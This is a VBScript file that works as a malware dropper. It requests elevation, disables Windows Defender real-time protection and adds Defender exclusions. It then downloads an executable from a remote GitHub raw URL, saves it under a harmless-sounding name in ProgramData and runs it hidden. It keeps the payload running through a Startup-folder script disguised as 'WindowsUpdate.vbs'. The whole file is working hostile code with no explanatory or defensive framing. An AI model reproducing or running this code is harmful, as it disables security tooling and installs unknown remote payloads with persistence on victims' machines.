Option Explicit

Dim TARGET_DIR_NAME, EXE_NAME, DOWNLOAD_URL
TARGET_DIR_NAME = "SecureApp"
EXE_NAME = "clean.exe"
DOWNLOAD_URL = "https://github.com/Romania123456/bom/raw/refs/heads/main/ZGB2025.exe"

Dim WshShell, fso
Set WshShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

If WScript.Arguments.Length = 0 Then
    CreateObject("Shell.Application").ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34) & " /elevated", "", "runas", 0
    WScript.Quit
End If

TempDisableDefender

Dim programData, targetDir, exePath
programData = WshShell.ExpandEnvironmentStrings("%PROGRAMDATA%")
targetDir = programData & "\" & TARGET_DIR_NAME
If Not fso.FolderExists(targetDir) Then fso.CreateFolder(targetDir)

AddDefenderExclusion targetDir, "folder"

exePath = targetDir & "\" & EXE_NAME

If fso.FileExists(exePath) Then fso.DeleteFile exePath, True
If Not DownloadFile(DOWNLOAD_URL, exePath) Then WScript.Quit

AddDefenderExclusion exePath, "process"
CreateStartupFile exePath
ExecuteApplication exePath
WScript.Quit

Sub TempDisableDefender()
    Dim cmd
    cmd = "powershell -WindowStyle Hidden -Command " & Chr(34) & "Set-MpPreference -DisableRealtimeMonitoring $true" & Chr(34)
    WshShell.Run cmd, 0, True
    WScript.Sleep 2000
End Sub

Sub AddDefenderExclusion(path, exclusionType)
    Dim psCommand, cmd
    If LCase(exclusionType) = "folder" Then
        psCommand = "Add-MpPreference -ExclusionPath " & Chr(34) & path & Chr(34)
    ElseIf LCase(exclusionType) = "process" Then
        psCommand = "Add-MpPreference -ExclusionProcess " & Chr(34) & path & Chr(34)
    Else
        Exit Sub
    End If
    cmd = "powershell -WindowStyle Hidden -Command " & Chr(34) & psCommand & Chr(34)
    WshShell.Run cmd, 0, True
End Sub

Function DownloadFile(url, savePath)
    Dim xmlhttp, adoStream, status, newUrl
    DownloadFile = False
    Set xmlhttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    xmlhttp.Open "GET", url, False
    xmlhttp.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    xmlhttp.Send
    status = xmlhttp.Status
    If status = 200 Then
        If SaveResponse(xmlhttp, savePath) Then DownloadFile = True
    ElseIf status >= 300 And status < 400 Then
        newUrl = xmlhttp.getResponseHeader("Location")
        If newUrl <> "" Then
            Set xmlhttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
            xmlhttp.Open "GET", newUrl, False
            xmlhttp.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
            xmlhttp.Send
            If xmlhttp.Status = 200 Then
                If SaveResponse(xmlhttp, savePath) Then DownloadFile = True
            End If
        End If
    End If
End Function

Function SaveResponse(xmlhttp, savePath)
    Dim adoStream
    SaveResponse = False
    On Error Resume Next
    Set adoStream = CreateObject("ADODB.Stream")
    adoStream.Type = 1
    adoStream.Open
    adoStream.Write xmlhttp.ResponseBody
    adoStream.SaveToFile savePath, 2
    adoStream.Close
    If Err.Number = 0 Then SaveResponse = True
    On Error GoTo 0
End Function

Sub ExecuteApplication(appPath)
    WshShell.Run Chr(34) & appPath & Chr(34), 0, False
End Sub

Sub CreateStartupFile(exePath)
    Dim startupFolder, startupFile, fileHandle
    startupFolder = WshShell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup"
    If Not fso.FolderExists(startupFolder) Then fso.CreateFolder startupFolder
    startupFile = startupFolder & "\WindowsUpdate.vbs"
    If fso.FileExists(startupFile) Then fso.DeleteFile startupFile, True
    Set fileHandle = fso.CreateTextFile(startupFile, True)
    fileHandle.WriteLine "Option Explicit"
    fileHandle.WriteLine "Dim WshShell"
    fileHandle.WriteLine "Set WshShell = CreateObject(" & Chr(34) & "WScript.Shell" & Chr(34) & ")"
    fileHandle.WriteLine "WshShell.Run " & Chr(34) & exePath & Chr(34) & ", 0, False"
    fileHandle.Close
    AddDefenderExclusion startupFolder, "folder"
    AddDefenderExclusion startupFile, "process"
End Sub
